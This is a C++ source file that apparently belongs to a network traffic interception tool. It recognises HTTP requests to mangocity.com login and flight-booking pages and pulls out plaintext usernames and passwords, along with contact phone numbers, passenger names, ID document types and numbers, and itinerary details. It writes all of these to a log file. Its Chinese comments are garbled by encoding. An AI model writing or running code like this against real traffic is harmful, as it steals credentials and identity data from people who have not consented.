//MangGuo.cpp: implementation of the MangGuo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MangGuo.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

MangGuo::MangGuo(HttpSession *http_session, const string &pro_name) : Traffic(http_session, pro_name)
{

}

MangGuo::~MangGuo()
{

}

// �����֤������
extern char* credential_type_Manguo[][2] = 
{{"IDC","���֤"},
{"PSP","����"},
{"MOC","����֤"},
{"TW1","����֤"},
{"TW2","̨��֤"},
{"HKM","�۰�ͨ��֤"},
{"HKP","���ڲ�"},
{"CSZ","����֤��"},
{"SEA","���ʺ�Ա֤"},
{"FOR","��������þ���֤"},
{"OTHER","����"},
};

//��ȡ֤������
string MangGuo::GetCredentialType(string passengerIDCardTypeTemp)
{
	for (int iCode = 0; iCode < sizeof(credential_type_Manguo)/sizeof(credential_type_Manguo[0]); iCode ++)
	{
		if (passengerIDCardTypeTemp.compare(credential_type_Manguo[iCode][0]) == 0)
		{
			return credential_type_Manguo[iCode][1];;
		}
	}
	return passengerIDCardTypeTemp;
}

int MangGuo::Is(HttpSession *http_session)
{
	//pc ��¼
	if((http_session->m_Requestline.m_Host.Find("www.mangocity.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/mbrWebCenter/login/doLogin.action")!=-1))
	{
		return PC_LOGIN;
	}
	// PC �ɻ�Ʊ ���ڻ�Ʊ
	if((http_session->m_Requestline.m_Host.Find("flight1.mangocity.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/reserve.shtml")!=-1))
	{
		return PC_AIRPLANE;
	}
	return 0;
}

int MangGuo::Process(const char *packet,int action)
{
	//pc ��¼
	if (action == PC_LOGIN)
	{
		string src_data(packet);
		src_data=ms_->UrlDecode(src_data);
		ms_->SplitStringToMap(src_data,'&','=');
		string user,pass;
		user=ms_->GetValueFromMapByKey("loginid1",true);
		pass=ms_->GetValueFromMapByKey("loginpwd1",true);
		if ( user.empty() || pass.empty())
		{
			return 0;
		}	
		output_text_ = 
			"user=" + user + "\r\n" + 
			"pass=" + pass + "\r\n" + 
			"state=��¼\r\n";	
		WriteIndexFile();
	}

	if (action == PC_AIRPLANE)
	{
		string sContent = ms_->UTF8ToGBK(UrlDecode(packet));   
		ms_->SplitStringToMap(sContent,'&','=');
		//���� (��ϵ����������ϵ�˵绰����ϵ�����䣬��������(������)��Ŀ�Ļ���(������)������ţ��������ڣ���������) + ����
		//���� (��ϵ����������ϵ�˵绰����ϵ�����䣬ȥ�̳�������(������)��ȥ��Ŀ�Ļ���(������)��ȥ�̺���ţ�ȥ�̳������ڣ�ȥ�̵������ڣ����̳�������(������)�����̵������(������)�����̺���	
		//		�ţ����̳������ڣ����̵�������)
		//���� (�˿��������˿����ͣ��˿�֤�����ͣ��˿�֤���ţ��˿ͳ�������)	

		string linkmanName,linkmanMobile,linkmanEmail;
		string FlightType;
		string depCityOw,arrcityOw,airlineOw,depDateOw,depTimeOw,depTerminalOw,arrDateOw,arrTiemOw,arrTerminalOw;
		string depCityRt,arrcityRt,airlineRt,depDateRt,depTimeRt,depTerminalRt,arrDateRt,arrTiemRt,arrTerminalRt;
		string psgName,psgType,certType,certId,psgBirthdate;

		//��ȡ�˿͵�����
		string temp = sContent.substr(sContent.rfind("bookPassengers"),sContent.length()-sContent.rfind("bookPassengers"));
		int pos = temp.rfind("bookPassengers");
		string People = temp.substr(pos+ strlen("bookPassengers") + strlen("["),1);
	    int PassengerCount = atoi(People.c_str());

		//��ϵ������
		linkmanName = ms_->GetValueFromMapByKey("linkmanInfo.linkmanName",true);
		//��ϵ�˵绰
		linkmanMobile = ms_->GetValueFromMapByKey("linkmanInfo.linkmanMobile",true); 
		//��ϵ������
		//linkmanEmail = ms_->GetValueFromMapByKey("linkmanInfo.linkmanEmail",true); 

		//��������
		FlightType = ms_->GetValueFromMapByKey("bookTrips[1].tripType",true);
		if (strcmp(FlightType.c_str(),"RT") != 0)
		{
			//����
			//ȥ�̳�������(������)
			depCityOw = ms_->GetValueFromMapByKey("bookTrips[0].depCity",true); 
			//ȥ��Ŀ�Ļ���(������)
			arrcityOw = ms_->GetValueFromMapByKey("bookTrips[0].arrCity",true); 
			//ȥ�̺����
			airlineOw = ms_->GetValueFromMapByKey("bookTrips[0].airline",true); 
			//ȥ�̳������� depTimeOw(����ʱ��) depTerminalOw(վ̨)
			depDateOw = ms_->GetValueFromMapByKey("bookTrips[0].depDate",true) + " " + ms_->GetValueFromMapByKey("bookTrips[0].depTime",true);  
			//ȥ�̵������� arrTimeOw(����ʱ��) arrTerminalOw(վ̨)
			arrDateOw = ms_->GetValueFromMapByKey("bookTrips[0].arrDate",true) + " " + ms_->GetValueFromMapByKey("bookTrips[0].arrTime",true);  
				
			type_   = "���ڵ��̻�Ʊ";
		}
		if (strcmp(FlightType.c_str(),"RT") == 0)
		{
			//����
			//ȥ�̳�������(������)
			depCityOw = ms_->GetValueFromMapByKey("bookTrips[0].depCity",true); 
			//ȥ��Ŀ�Ļ���(������)
			arrcityOw = ms_->GetValueFromMapByKey("bookTrips[0].arrCity",true); 
			//ȥ�̺����
			airlineOw = ms_->GetValueFromMapByKey("bookTrips[0].airline",true); 
			//ȥ�̳������� depTimeOw(����ʱ��) depTerminalOw(վ̨)
			depDateOw = ms_->GetValueFromMapByKey("bookTrips[0].depDate",true) + " " + ms_->GetValueFromMapByKey("bookTrips[0].depTime",true);  
			//ȥ�̵������� arrTimeOw(����ʱ��) arrTerminalOw(վ̨)
			arrDateOw = ms_->GetValueFromMapByKey("bookTrips[0].arrDate",true) + " " + ms_->GetValueFromMapByKey("bookTrips[0].arrTime",true); 

			//���̳�������(������)
			depCityRt = ms_->GetValueFromMapByKey("bookTrips[1].depCity",true);
			//���̵������(������)
			arrcityRt = ms_->GetValueFromMapByKey("bookTrips[1].arrCity",true);
			//���̺����
			airlineRt = ms_->GetValueFromMapByKey("bookTrips[1].airline",true); 
			//���̳������� depTimeRt(����ʱ��) depTerminalRt(վ̨)
			depDateRt = ms_->GetValueFromMapByKey("bookTrips[1].depDate",true) + " " + ms_->GetValueFromMapByKey("bookTrips[1].depTime",true); 
			//���̵������� arrTiemRt(����ʱ��) arrTerminalRt(վ̨)
			arrDateRt = ms_->GetValueFromMapByKey("bookTrips[1].arrDate",true) + " " +ms_->GetValueFromMapByKey("bookTrips[1].arrTime",true); 

			type_   = "����������Ʊ";
		}
		
        for (int j=0;j < PassengerCount + 1;j++)
        {
			//ת��
			CString str;
			str.Format("%d",j);
			string strEnd = str.GetBuffer(0);
			//�˿�����
			string strTempName = "bookPassengers[" + strEnd + "].psgName";
			psgName = ms_->GetValueFromMapByKey(strTempName,true); 
			//�˿�����	
			string strTempType = "bookPassengers[" + strEnd + "].psgType";
			psgType = ms_->GetValueFromMapByKey(strTempType,true); 
			if (psgType == "ADT")
			{
				psgType = "����Ʊ";
			}
			if (psgType == "CHD")
			{
				psgType = "��ͯƱ";
			}
			if (psgType == "INF")
			{
				psgType = "Ӥ��Ʊ";
			}
			//�˿�֤������
			string strCertType = "bookPassengers[" + strEnd + "].certType";
			certType = ms_->GetValueFromMapByKey(strCertType,true); 
			certType = GetCredentialType(certType);
			//�˿�֤����
			string strCertNumber = "bookPassengers[" + strEnd + "].certId";
			certId = ms_->GetValueFromMapByKey(strCertNumber,true);  
			//�˿����� (��ʱû���ֶα���)
			string strBirthday = "bookPassengers[" + strEnd + "].psgBirthdate";
			psgBirthdate = ms_->GetValueFromMapByKey(strBirthday,true);			
			if (strcmp(FlightType.c_str(),"RT") != 0)
			{
				output_text_ = 
					"mid=" + 		linkmanName + "\r\n" +		//��ϵ������
					"oid=" + 		linkmanMobile + "\r\n" +	//��ϵ�˵绰
					"msgtype=" + 	psgName + "\r\n" +			//�˿�����
					"webname=" + 	certType + "\r\n" +			//�˿�֤������
					"netmark=" + 	certId + "\r\n" +			//�˿�֤����
					"onick=" + 		depCityOw + "\r\n" +		//��������
					"mid=" + 		arrcityOw + "\r\n" +		//�������
					"servername=" + depDateOw + "\r\n" +		//��������
					"islogin=" + 	airlineOw + "\r\n" +		//�����
					"platform=���������\r\n" +
					"state=" + type_ + "\r\n";	
				WriteIndexFile();
			}
			if (strcmp(FlightType.c_str(),"RT") == 0)
			{
				output_text_ = 
					"mid=" + 		linkmanName + "\r\n" +		//��ϵ������
					"oid=" + 		linkmanMobile + "\r\n" +	//��ϵ�˵绰
					"msgtype=" + 	psgName + "\r\n" +			//�˿�����
					"webname=" + 	certType + "\r\n" +			//�˿�֤������
					"netmark=" + 	certId + "\r\n" +			//�˿�֤����
					"onick=" + 		depCityOw + "\r\n" +		//��������
					"mid=" + 		arrcityOw + "\r\n" +		//�������
					"servername=" + depDateOw + "\r\n" +		//��������
					"appname=" + 	depDateRt + "\r\n" +		//��������
					"islogin=" + 	airlineOw + "\r\n" +		//�����
					"platform=���������\r\n" +
					"state=" + type_ + "\r\n";			
				WriteIndexFile();
			}
        }		
		return 0;
	}
	return 0; 
}
